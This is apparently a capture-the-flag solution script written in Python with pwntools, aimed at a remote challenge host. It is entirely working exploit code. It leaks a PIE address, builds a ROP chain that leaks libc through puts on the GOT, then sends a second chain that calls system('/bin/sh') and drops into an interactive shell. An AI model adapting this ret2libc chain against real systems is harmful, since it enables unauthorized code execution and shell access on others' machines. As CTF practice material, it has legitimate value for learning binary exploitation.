#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./chall_patched")
libc = ELF("./libc.so.6")



def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("playground.tcp1p.team",19001)
        # host = "2b3e03ad9fbfd024830fa18a-1024-intro-pwn-1.challenge.cscg.live"
        # port = 1337

        # r = remote(host, port, ssl=True)

    return r


def main():
    # good luck pwning :)
    mov_rdi_rbp_nop_rbp = 0x00000000000011e7
    offset = 40
    r = conn()
    r.sendline("2")
    r.sendline("1")
    r.recvuntil(b"oke okeeeyy ini pie nya untukmuu, ")
    leak_pie = int(r.recvline().strip().decode(),16)
    exe.address = leak_pie - exe.sym['main']
    mov_rdi_rbp_nop_rbp += exe.address
    log.info(f"BASE {hex(exe.address)}")
    rop = ROP(context.binary)
    r.sendline("3")
    rop.raw(b"A" * offset)
    rbp = rop.find_gadget(['pop rbp','ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    rop.raw(rbp)
    rop.raw(exe.got['puts'])
    rop.raw(mov_rdi_rbp_nop_rbp)
    rop.raw("AAAAAAAA")
    rop.raw(exe.plt['puts'])
    rop.raw(exe.sym['main'])
    r.sendline(rop.chain())
    r.recvuntil(b"\n\n")
    base_libc = u64(r.recvline().strip() + b"\x00\x00") - libc.sym['puts']
    libc.address = base_libc
    r.sendline("3")
    rop2 = ROP(libc)
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    rdi = rop2.find_gadget(['pop rdi','ret'])[0]
    # ret = rop2.find_gadget(['ret'])[0]
    rop2.raw(b"A" * offset)
    rop2.raw(rdi)
    rop2.raw(bin_sh)
    rop2.raw(ret)
    rop2.raw(libc.sym['system'])
    log.info(f"BASE LIBC {hex(libc.address)}")
    r.sendline(rop2.chain())
    r.interactive()


if __name__ == "__main__":
    main()
